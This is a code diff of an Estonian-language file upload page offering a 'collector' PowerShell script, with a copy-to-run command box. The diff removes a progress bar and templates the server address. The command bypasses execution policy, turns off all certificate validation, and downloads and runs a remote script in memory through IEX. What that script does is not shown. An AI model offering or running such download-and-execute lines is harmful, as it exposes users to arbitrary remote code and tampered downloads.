@@ -88,7 +88,6 @@
         <form id="uploadForm">
                 <div id="dropzone">Lohista failid siia või klõpsa valimiseks</div>
                 <input type="file" name="files" id="files" multiple style="display:none;">
-                <div class="progress"><div class="progress-bar" id="progressBar"></div></div>
         </form>
 
         <a href="mCollector.ps1" download>[⇩] Laadi alla PowerShelli skript (mCollector.ps1)</a>
@@ -101,7 +100,7 @@
                 </div>
 <p style="color:#00ff00; font-size:0.85em; margin-bottom:0.4em; text-align:center; margin-top:1em;">Või käivita see käsurida -:)</p>
                 <div class="cmdbox" onclick="copyCmd(this)" title="Klõpsa kopeerimiseks">
-                        <code style="font-size:0.78em; word-break:break-all;">powershell -ep bypass -c "Add-Type 'using System.Net;using System.Net.Security;using System.Security.Cryptography.X509Certificates;public class T:ICertificatePolicy{public bool CheckValidationResult(ServicePoint s,X509Certificate c,WebRequest r,int p){return true;}}';[Net.ServicePointManager]::CertificatePolicy=New-Object T;[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;IEX(New-Object Net.WebClient).DownloadString('https://mytt/mCollector.ps1')"</code>
+                        <code style="font-size:0.78em; word-break:break-all;">powershell -ep bypass -c "Add-Type 'using System.Net;using System.Net.Security;using System.Security.Cryptography.X509Certificates;public class T:ICertificatePolicy{public bool CheckValidationResult(ServicePoint s,X509Certificate c,WebRequest r,int p){return true;}}';[Net.ServicePointManager]::CertificatePolicy=New-Object T;[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;IEX(New-Object Net.WebClient).DownloadString('https://{{SERVER_IP}}/mCollector.ps1')"</code>
                         <span class="copyLabel">[kopeeri]</span>
                 </div>
         </div>
